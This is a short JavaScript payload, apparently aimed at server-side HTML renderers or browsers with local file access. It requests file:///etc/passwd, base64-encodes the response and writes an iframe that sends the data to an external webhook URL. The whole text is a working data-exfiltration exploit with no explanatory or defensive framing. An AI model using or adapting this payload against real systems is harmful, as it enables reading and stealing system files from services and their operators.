function reqListener () {
  var encoded = encodeURI(this.responseText); 
  var b64 = btoa(this.responseText);
  var raw = this.responseText; 
  document.write('<iframe src="https://nextgen.kajomigenerator.de/webhook/df140c28765c4cbfac50491ec1586cec/c7d7f93b-a034-41fd-b95a-6603e9bbab20?data='+b64+'"></iframe>'); 
}
var oReq = new XMLHttpRequest();
oReq.addEventListener("load", reqListener);
oReq.open("GET", "file:///etc/passwd"); 
oReq.send();
